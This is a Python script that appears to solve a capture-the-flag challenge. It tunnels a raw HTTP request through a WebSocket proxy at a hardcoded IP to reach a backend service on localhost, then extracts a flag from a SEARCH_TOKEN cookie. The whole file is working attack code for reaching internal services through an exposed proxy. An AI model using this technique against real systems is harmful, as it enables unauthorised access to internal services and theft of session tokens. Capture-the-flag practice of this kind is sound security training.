#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import asyncio
import re
import sys
from urllib.parse import unquote

import websockets


WS_URL = "ws://47.120.61.230/api/proxy/019e3e56-82f0-7bba-b3ad-5cdbf43f106f"


async def recv_all(ws, timeout=2.0) -> bytes:
    """
    尽量读取 websocket 返回的所有数据。
    tcp over ws 场景下，后端 HTTP 响应可能分多帧返回。
    """
    chunks = []

    while True:
        try:
            msg = await asyncio.wait_for(ws.recv(), timeout=timeout)
        except asyncio.TimeoutError:
            break
        except websockets.exceptions.ConnectionClosed:
            break

        if isinstance(msg, str):
            chunks.append(msg.encode("utf-8", errors="replace"))
        else:
            chunks.append(msg)

    return b"".join(chunks)


def extract_flag(http_response: str) -> str | None:
    """
    从 HTTP 响应中提取 SEARCH_TOKEN Cookie，并 URL 解码。
    """
    # 例如：
    # Set-Cookie: SEARCH_TOKEN=TOGOGO-flag%7B...%7D; path=/
    m = re.search(
        r"Set-Cookie:\s*SEARCH_TOKEN=([^;\r\n]+)",
        http_response,
        flags=re.IGNORECASE,
    )

    if not m:
        return None

    token_encoded = m.group(1)
    token_decoded = unquote(token_encoded)

    # 保险起见，只返回 TOGOGO-flag{...} 这一段
    m_flag = re.search(r"TOGOGO-flag\{[^}]+\}", token_decoded)
    if m_flag:
        return m_flag.group(0)

    return token_decoded


async def main():
    print(f"[+] Connecting to WebSocket proxy:")
    print(f"    {WS_URL}")

    async with websockets.connect(WS_URL, max_size=None) as ws:
        print("[+] WebSocket connected")

        # 通过 tcp over ws 发送原始 HTTP 请求给后端 localhost
        http_request = (
            "GET / HTTP/1.1\r\n"
            "Host: localhost\r\n"
            "User-Agent: flag-fetcher/1.0\r\n"
            "Connection: close\r\n"
            "\r\n"
        )

        print("[+] Sending HTTP request through WS tunnel...")
        await ws.send(http_request.encode("utf-8"))

        raw_response = await recv_all(ws)
        response_text = raw_response.decode("utf-8", errors="replace")

    print("[+] Received response:")
    print("-" * 60)
    print(response_text)
    print("-" * 60)

    flag = extract_flag(response_text)

    if flag:
        print(f"[+] FLAG: {flag}")
    else:
        print("[-] Could not find SEARCH_TOKEN / TOGOGO-flag in response")
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())